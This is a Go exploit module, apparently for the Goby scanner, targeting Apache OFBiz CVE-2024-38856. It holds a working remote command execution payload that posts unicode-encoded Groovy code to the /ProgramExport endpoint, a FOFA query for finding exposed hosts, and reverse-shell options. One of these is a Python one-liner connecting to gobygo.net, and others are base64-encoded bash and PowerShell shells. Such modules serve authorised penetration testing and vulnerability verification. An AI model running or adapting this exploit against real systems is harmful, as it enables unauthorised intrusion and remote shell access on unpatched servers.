package exploits

import (
	"encoding/base64"
	"errors"
	"fmt"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Apache OFbiz /ProgramExport Command Execution Vulnerability(CVE-2024-38856)",
    "Description": "<p>Apache OFBiz is an e-commerce platform used to build multi-layer and distributed e-commerce application systems at the enterprise level, cross-platform, cross-database, and cross-application servers. </p><p>Apache OFBiz has a logical flaw in handling the rendering of the view view, and an attacker can execute arbitrary code by constructing a special URL to override the final rendered view.</p>",
    "Product": "Apache_OFBiz",
    "Homepage": "http://ofbiz.apache.org/",
    "DisclosureDate": "2024-08-05",
    "PostTime": "2024-08-06",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "cert=\"Organizational Unit: Apache OFBiz\" || (body=\"www.ofbiz.org\" && body=\"/images/ofbiz_powered.gif\") || header=\"Set-Cookie: OFBiz.Visitor\" || banner=\"Set-Cookie: OFBiz.Visitor\"",
    "GobyQuery": "cert=\"Organizational Unit: Apache OFBiz\" || (body=\"www.ofbiz.org\" && body=\"/images/ofbiz_powered.gif\") || header=\"Set-Cookie: OFBiz.Visitor\" || banner=\"Set-Cookie: OFBiz.Visitor\"",
    "Level": "3",
    "Impact": "<p>Apache OFBiz has a logical flaw in handling the rendering of the view view, and an attacker can execute arbitrary code by constructing a special URL to override the final rendered view.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://ofbiz.apache.org/\">https://ofbiz.apache.org/</a></p>",
    "References": [
        "https://unam4.github.io/2024/08/05/CVE-2024-38856-ofbiz-12-14-filter%E7%BB%95%E8%BF%87%E5%88%B0rce/index.html#0x01-Vulnerability-description"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2024-38856"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.0",
    "Translation": {
        "CN": {
            "Name": "Apache OFbiz /ProgramExport 命令执行漏洞（CVE-2024-38856）",
            "Product": "Apache_OFBiz",
            "Description": "<p>Apache OFBiz是一个电子商务平台，用于构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类应用系统。</p><p>Apache OFBiz在处理view视图渲染的时候存在逻辑缺陷，攻击者可通过构造特殊URL来覆盖最终的渲染视图，从而执行任意代码。</p>",
            "Recommendation": "<p>厂商已发布了新版本，请及时关注更新：<a href=\"https://ofbiz.apache.org/\">https://ofbiz.apache.org/</a><br></p>",
            "Impact": "<p>Apache OFBiz在处理view视图渲染的时候存在逻辑缺陷，攻击者可通过构造特殊URL来覆盖最终的渲染视图，从而执行任意代码。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Apache OFbiz /ProgramExport Command Execution Vulnerability(CVE-2024-38856)",
            "Product": "Apache_OFBiz",
            "Description": "<p>Apache OFBiz is an e-commerce platform used to build multi-layer and distributed e-commerce application systems at the enterprise level, cross-platform, cross-database, and cross-application servers.&nbsp;</p><p>Apache OFBiz has a logical flaw in handling the rendering of the view view, and an attacker can execute arbitrary code by constructing a special URL to override the final rendered view.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://ofbiz.apache.org/\">https://ofbiz.apache.org/</a><br></p>",
            "Impact": "<p>Apache OFBiz has a logical flaw in handling the rendering of the view view, and an attacker can execute arbitrary code by constructing a special URL to override the final rendered view.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9919"
}`
	setPayloadRequestHashcanscj823jnf7y23yfg2gydvb2 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//command为原始命令，如果需编码，请自行编码后使用

		//漏洞url地址
		vulURL := "/webtools/control/main/ProgramExport"
		makeRequest := httpclient.NewPostRequestConfig(vulURL)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
		makeRequest.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		//将command中的'替换为\'
		command = strings.Replace(command, "'", "\"", -1)
		command = "throw new Exception('" + command + "'.execute().text);"
		//将字符串command的全部字符转化为unicode编码
		unicodeCommand := ""
		for _, r := range command {
			unicodeCommand += fmt.Sprintf("\\u%04x", r)
		}
		data := "groovyProgram=" + unicodeCommand
		makeRequest.Data = data
		resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to execute command")
			return "", vulURL, err
		}
		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := resp.RawBody

		return commandResult, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashcanscj823jnf7y23yfg2gydvb2

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashcanscj823jnf7y23yfg2gydvb2

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c {echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					re, _ := regexp.Compile(`java\.lang\.Exception:((.|\n)*?)</p>`)
					if !re.MatchString(Result) {
						expResult.Success = false
						expResult.Output += "false"
						return expResult
					}
					match := re.FindStringSubmatch(Result)
					Result := ""
					if len(match) > 1 {
						Result = match[1]
					} else {
						Result = match[0]
					}
					expResult.Success = true
					expResult.Output += "Command Result: \n" + Result
					return expResult
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
